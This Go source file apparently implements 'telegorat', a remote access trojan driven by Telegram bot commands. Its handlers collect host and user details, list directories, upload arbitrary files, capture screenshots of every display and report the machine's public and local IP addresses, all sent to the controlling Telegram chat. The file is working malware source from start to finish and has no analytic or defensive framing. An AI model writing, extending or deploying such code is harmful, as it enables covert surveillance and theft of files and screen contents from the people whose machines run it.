package main

import (
	"fmt"
	"image/png"
	"log"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"telegorat/helpers"
	"time"

	"github.com/PaulSonOfLars/gotgbot/v2"
	"github.com/PaulSonOfLars/gotgbot/v2/ext"
	"github.com/PaulSonOfLars/gotgbot/v2/ext/handlers"

	"github.com/kbinani/screenshot"
)

func main() {

	token := os.Getenv("BOT_TOKEN")

	//Create new bot using the bot API token
	b, err := gotgbot.NewBot(token, &gotgbot.BotOpts{
		Client: http.Client{},
		DefaultRequestOpts: &gotgbot.RequestOpts{
			Timeout: gotgbot.DefaultTimeout * 3,
			APIURL:  gotgbot.DefaultAPIURL,
		},
	})
	if err != nil {
		panic("Failed to create new bot: " + err.Error())
	}

	//Create updater and dispatcher
	updater := ext.NewUpdater(&ext.UpdaterOpts{
		Dispatcher: ext.NewDispatcher(&ext.DispatcherOpts{
			//If an error is returned by a handler, log it and continue going.
			Error: func(b *gotgbot.Bot, ctx *ext.Context, err error) ext.DispatcherAction {
				log.Println("An error occurred while handling update:", err.Error())
				return ext.DispatcherActionNoop
			},
			MaxRoutines: ext.DefaultMaxRoutines,
		}),
	})
	dispatcher := updater.Dispatcher

	//List available commands
	dispatcher.AddHandler(handlers.NewCommand("help", getHelp))
	//Get the bot ID
	dispatcher.AddHandler(handlers.NewCommand("ping", pingPong))
	// Get basic host info
	dispatcher.AddHandler(handlers.NewCommand("systeminfo", systemInfo))
	//List files/directories
	dispatcher.AddHandler(handlers.NewCommand("list", listFiles))
	//Read file
	dispatcher.AddHandler(handlers.NewCommand("file", readFile))
	//Take screenshot
	dispatcher.AddHandler(handlers.NewCommand("screenshot", takeScreenshot))
	//Get public IP address
	dispatcher.AddHandler(handlers.NewCommand("ip", getIPs))

	//Start polling for updates
	err = updater.StartPolling(b, &ext.PollingOpts{
		DropPendingUpdates: true,
		GetUpdatesOpts: gotgbot.GetUpdatesOpts{
			Timeout: 9,
			RequestOpts: &gotgbot.RequestOpts{
				Timeout: time.Second * 10,
			},
		},
	})
	if err != nil {
		panic("Failed to start polling: " + err.Error())
	}
	log.Printf("%s has been started...\n", b.User.Username)

	//Idle, to keep updates coming in, and avoid bot stopping.
	updater.Idle()

}

func getHelp(b *gotgbot.Bot, ctx *ext.Context) error {

	//Array contains the available commands
	commands := []string{"/ping", "/systeminfo","/list <dir>", "/file <file>", "/screenshot", "/ip"}

	//Reply with list of available commands
	_, err := b.SendMessage(ctx.EffectiveChat.Id, strings.Join([]string(commands), "\n"), &gotgbot.SendMessageOpts{
		//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
	})
	if err != nil {
		return fmt.Errorf("Failed to send message: %w", err)
	}

	return nil
}

func pingPong(b *gotgbot.Bot, ctx *ext.Context) error {

	//Reply to ping command with pong
	_, err := b.SendMessage(ctx.EffectiveChat.Id, "pong", &gotgbot.SendMessageOpts{
		//ReplyToMessageId: ctx.EffectiveMessage.MessageId
	})
	if err != nil {
		return fmt.Errorf("Failed to send start message: %w", err)
	}
	return nil
}

func systemInfo(b *gotgbot.Bot, ctx *ext.Context) error {

	user, err := user.Current()
	if err != nil {
		return fmt.Errorf("Failed to get user: %w", err)
	}

	hostname, err := os.Hostname()
	if err != nil {
		return fmt.Errorf("Failed to get hostname: %w", err)
	}

	operatingSystem := runtime.GOOS

	architecture := runtime.GOARCH

	//Reply to ping command with pong
	_, err = b.SendMessage(ctx.EffectiveChat.Id, fmt.Sprintf("Username: %s\nHostname: %s\nOS : %s\nArch: %s", user.Username, hostname, operatingSystem, architecture), &gotgbot.SendMessageOpts{
		ParseMode: "html",
		//ReplyToMessageId: ctx.EffectiveMessage.MessageId
	})
	if err != nil {
		return fmt.Errorf("Failed to send start message: %w", err)
	}
	return nil
}

func listFiles(b *gotgbot.Bot, ctx *ext.Context) error {

	//Read the effective message text (e.g. /list C:\Users\)
	messageText := ctx.EffectiveMessage.Text

	//Extract the filename from the message (e.g. C:\Users\)
	dirName, err := helpers.ExtractArgument(messageText)
	if err != nil {

		//If no argument provided send intructions
		_, err = b.SendMessage(ctx.EffectiveChat.Id, "Usage: <b>/list</b> &lt;dir_path&gt;", &gotgbot.SendMessageOpts{
			ParseMode: "html",
			//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
		})
		if err != nil {
			return fmt.Errorf("Failed to send message: %w", err)
		}

		return fmt.Errorf("Failed to parse command: %w", err)
	}

	//Read the named directory
	files, err := os.ReadDir(dirName)
	if err != nil {
		return fmt.Errorf("Failed to read directory: %w", err)
	}

	var result strings.Builder

	for _, file := range files {
		file_info := fmt.Sprintf("%-5c\t%s", file.Type().String()[0], file.Name())
		result.WriteString(file_info)
		result.WriteString("\n")
	}

	//If no argument provided send intructions
	_, err = b.SendMessage(ctx.EffectiveChat.Id, result.String(), &gotgbot.SendMessageOpts{
		//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
	})
	if err != nil {
		return fmt.Errorf("Failed to send message: %w", err)
	}

	return nil
}

func readFile(b *gotgbot.Bot, ctx *ext.Context) error {

	//Read the effective message text (e.g. /file C:\test.txt)
	messageText := ctx.EffectiveMessage.Text

	//Extract the filename from the message (e.g. C:\test.txt)
	fileName, err := helpers.ExtractArgument(messageText)
	if err != nil {
		//If no argument provided send intructions
		_, err = b.SendMessage(ctx.EffectiveChat.Id, "Usage: <b>/file</b> &lt;filen_path&gt;", &gotgbot.SendMessageOpts{
			ParseMode: "html",
			//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
		})
		if err != nil {
			return fmt.Errorf("Failed to send message: %w", err)
		}

		return fmt.Errorf("Failed to parse command: %w", err)
	}

	file, err := os.Open(fileName)
	if err != nil {
		return fmt.Errorf("Failed to open file: %w", err)
	}

	//Send file to telegram server
	_, err = b.SendDocument(ctx.EffectiveChat.Id, file, &gotgbot.SendDocumentOpts{
		Caption: fileName,
		//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
	})
	if err != nil {
		return fmt.Errorf("Failed to send file: %w", err)
	}

	return nil
}

func takeScreenshot(b *gotgbot.Bot, ctx *ext.Context) error {

	//Number of active displays
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		//Display boundaries
		bounds := screenshot.GetDisplayBounds(i)

		//Capture screenshot into image data
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			return fmt.Errorf("Failed to capture screenshot: %w", err)
		}

		//Specify the image name
		fileName := filepath.Join(os.TempDir(), fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy()))

		//Temporarily creating a file to save the image
		file, _ := os.Create(fileName)
		if err != nil {
			return fmt.Errorf("Failed to create temporary file: %w", err)
		}

		//Encode image data to PNG format and write to output file
		png.Encode(file, img)

		fmt.Printf("Display #%d : %v \"%s\"\n", i, bounds, fileName)

		file.Close()

		//Read the image file
		image, err := os.Open(fileName)
		if err != nil {
			return fmt.Errorf("Failed to open screenshot: %w", err)
		}

		//Send image to telegram server
		_, err = b.SendPhoto(ctx.EffectiveChat.Id, image, &gotgbot.SendPhotoOpts{
			Caption: time.Now().Format("2006-01-02 15:04:05"),
			//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
		})
		if err != nil {
			return fmt.Errorf("Failed to send screenshot: %w", err)
		}

		image.Close()

		//Delete temporary file
		os.Remove(fileName)

	}

	return nil
}

func getIPs(b *gotgbot.Bot, ctx *ext.Context) error {

	//Get public IP
	publicIP, err := helpers.GetPublicIP()
	if err != nil {
		return fmt.Errorf("Failed to retrieve public IP address: %w", err)
	}

	//Get local IP
	localIP, err := helpers.GetLocalIP()
	if err != nil {
		return fmt.Errorf("Failed to retrieve local IP address: %w", err)
	}

	//Send IPs to telegram server
	_, err = b.SendMessage(ctx.EffectiveChat.Id, fmt.Sprintf("Public IP: <b>%s</b>\nLocal IP: <b>%s</b>", publicIP, localIP), &gotgbot.SendMessageOpts{
		ParseMode: "html",
		//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
	})
	if err != nil {
		return fmt.Errorf("Failed to send IP addresses: %w", err)
	}

	return nil
}
